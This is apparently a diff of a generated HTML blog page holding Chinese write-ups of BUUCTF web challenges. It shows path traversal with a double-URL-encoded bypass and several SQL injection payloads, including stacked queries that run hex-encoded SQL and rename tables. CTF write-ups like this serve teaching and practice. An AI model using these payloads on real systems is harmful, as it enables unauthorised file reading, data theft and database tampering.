@@ -9,8 +9,8 @@
 <meta property="og:description" content="0x00 [HCTF 2018]WarmUp 题目链接 引入眼帘的是个滑稽🤔 image-20210226211946197image-20210226211946197 &#34; image-20210226211946197 F12看源码，发现页面注释里提示源码在source.php。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://1iu2y.github.io/posts/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-02-26T21:16:12&#43;00:00" />
-<meta property="article:modified_time" content="2021-02-26T21:16:12&#43;00:00" />
+<meta property="article:published_time" content="2021-02-26T21:16:12+00:00" />
+<meta property="article:modified_time" content="2021-02-26T21:16:12+00:00" />
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="BUUCTF web记录"/>
@@ -27,7 +27,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/1iu2y.github.io\/posts\/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95\/"
-        },"genre": "posts","keywords": "CTF, web","wordcount":  2869 ,
+        },"genre": "posts","keywords": "CTF, web","wordcount":  2866 ,
         "url": "https:\/\/1iu2y.github.io\/posts\/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95\/","datePublished": "2021-02-26T21:16:12+00:00","dateModified": "2021-02-26T21:16:12+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -104,7 +104,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">BUUCTF web记录</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://github.com/liuliuliuzy" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>zyleo</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-02-26">2021-02-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2869 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-02-26">2021-02-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2866 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
@@ -144,7 +144,7 @@
 <p>F12看源码，发现页面注释里提示源码在<code>source.php</code>。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -196,7 +196,7 @@
 </span><span class="lnt">50
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="c1">// source.php
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="c1">// source.php
 </span><span class="c1"></span><span class="o">&lt;?</span><span class="nx">php</span>
     <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
     <span class="k">class</span> <span class="nc">emmm</span>
@@ -251,14 +251,14 @@
 </div><p>从<code>source.php</code>中还可以看到<code>hint.php</code>也包含一些信息。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;source&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;source.php&#34;</span><span class="p">,</span><span class="s2">&#34;hint&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;hint.php&#34;</span><span class="p">];</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;source&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;source.php&#34;</span><span class="p">,</span><span class="s2">&#34;hint&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;hint.php&#34;</span><span class="p">];</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$page</span><span class="p">))</span> <span class="p">{</span>
     <span class="k">echo</span> <span class="s2">&#34;you can&#39;t see it&#34;</span><span class="p">;</span>
     <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
@@ -279,7 +279,7 @@
 <p>再继续分析<code>source.php</code>，get的<code>file</code>参数要非空、为字符串且通过<code>checkFile()</code>函数判断，才能进入到<code>include</code>逻辑。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -290,7 +290,7 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
     <span class="o">&amp;&amp;</span> <span class="nx">is_string</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
     <span class="o">&amp;&amp;</span> <span class="nx">emmm</span><span class="o">::</span><span class="na">checkFile</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span>
    <span class="p">)</span> <span class="p">{</span>
@@ -305,7 +305,7 @@
 <p>首先定义了一个白名单。请求的文件名在白名单中即返回<code>true</code>，对应于之前提到的<code>source.php</code>和<code>hint.php</code>。显然这个逻辑无法被用来读取<code>flag</code>。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -316,7 +316,7 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;source&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;source.php&#34;</span><span class="p">,</span><span class="s2">&#34;hint&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;hint.php&#34;</span><span class="p">];</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;source&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;source.php&#34;</span><span class="p">,</span><span class="s2">&#34;hint&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;hint.php&#34;</span><span class="p">];</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$page</span><span class="p">))</span> <span class="p">{</span>
     <span class="k">echo</span> <span class="s2">&#34;you can&#39;t see it&#34;</span><span class="p">;</span>
     <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
@@ -331,7 +331,7 @@
 <p>相关函数：<a href="https://www.php.net/manual/zh/function.mb-strpos" target="_blank" rel="noopener noreffer">mb_strpos()</a>、<a href="https://www.php.net/manual/zh/function.mb-substr" target="_blank" rel="noopener noreffer">mb_substr()</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -341,7 +341,7 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$_page</span> <span class="o">=</span> <span class="nx">mb_substr</span><span class="p">(</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$_page</span> <span class="o">=</span> <span class="nx">mb_substr</span><span class="p">(</span>
     <span class="nv">$page</span><span class="p">,</span>
     <span class="mi">0</span><span class="p">,</span>
     <span class="nx">mb_strpos</span><span class="p">(</span><span class="nv">$page</span> <span class="o">.</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">)</span>
@@ -354,7 +354,7 @@
 </div><p>再看最后一个返回true的逻辑。发现其先将get请求中的file参数进行一次URL解码，然后再去截取<code>?</code>前的内容，判断是否在白名单内。同时，php在读取<code>$_REQUEST['file']</code>参数的时候，就会进行一次URL解码。所以，我们只需要在地址中加入<code>?</code>经过两次URL编码之后的内容<code>%253f</code>即可通过函数验证，并且使得参数在经过一次URL解码之后不含<code>?</code>，也就不会被当作其他get请求的参数。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -365,7 +365,7 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$_page</span> <span class="o">=</span> <span class="nx">urldecode</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$_page</span> <span class="o">=</span> <span class="nx">urldecode</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
 <span class="nv">$_page</span> <span class="o">=</span> <span class="nx">mb_substr</span><span class="p">(</span>
     <span class="nv">$_page</span><span class="p">,</span>
     <span class="mi">0</span><span class="p">,</span>
@@ -379,10 +379,10 @@
 </div><p>所以，可以构造payload。逐级添加<code>../</code>，找到<code>ffffllllaaaagggg</code>文件路径所在。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html">?file=source.php%253f/../../../../ffffllllaaaagggg
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html">?file=source.php%253f/../../../../ffffllllaaaagggg
 </code></pre></td></tr></table>
 </div>
 </div><p><figure><a class="lightgallery" href="/posts/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/image-20210226210928641.png" title="image-20210226210928641" data-thumbnail="/posts/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/image-20210226210928641.png" data-sub-html="<h2>image-20210226210928641</h2><p>image-20210226210928641</p>">
@@ -427,7 +427,7 @@
 <p>提交<code>admin' or '1'='1' #</code>，结果页面上显示这些东西。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -449,7 +449,7 @@
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-text" data-lang="text">array(2) {
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">array(2) {
  [0]=&gt;
  string(1) &#34;1&#34;
  [1]=&gt;
@@ -520,23 +520,23 @@ array(2) {
 <p>使用MySql的prepare功能，这是一个类似于计划任务的功能。将select查询语句转换为16进制，然后prepare&hellip;from&hellip;来执行该语句。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">1&#39;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">1&#39;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
 </code></pre></td></tr></table>
 </div>
 </div><h3 id="思路2">思路2</h3>
 <p>直接修改表的名字，<code>rename</code>/<code>alter</code>等关键字是没有被筛选的，所以可以被输入执行。先将<code>words</code>表名改为其他名字，再将<code>1919810931114514</code>表名改为<code>words</code>。因为当前页面的查询对象就是表<code>words</code>，所以可以直接进行查询。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">1&#39;;rename table `words` to `123`;rename table `1919810931114514` to `words`;alter table `words` add id int(10);#
-1&#39; or 1=1 #
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="mi">1</span><span class="s1">&#39;;rename table `words` to `123`;rename table `1919810931114514` to `words`;alter table `words` add id int(10);#
+</span><span class="s1">1&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="c1">#
+</span></code></pre></td></tr></table>
 </div>
 </div><h2 id="0x03-极客大挑战-2019havefun">0x03 [极客大挑战 2019]Havefun</h2>
 <p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Havefun" target="_blank" rel="noopener noreffer">题目链接</a></p>
@@ -574,10 +574,10 @@ array(2) {
 <p>据说这题比赛的时候给了源码，查询语句为</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span><span class="w"> </span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">Flag</span><span class="w">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span><span class="w"> </span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">Flag</span><span class="w">
 </span></code></pre></td></tr></table>
 </div>
 </div><p>于是，可以输入<code>*,1</code>，使得被执行的查询语句为<code>select *,1||flag from Flag</code>，也就是<code>select *,1 from flag</code>。从而获取flag内容。</p>
@@ -761,7 +761,7 @@ array(2) {
                 Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
             </noscript></div></article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.83.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.87.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
                 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
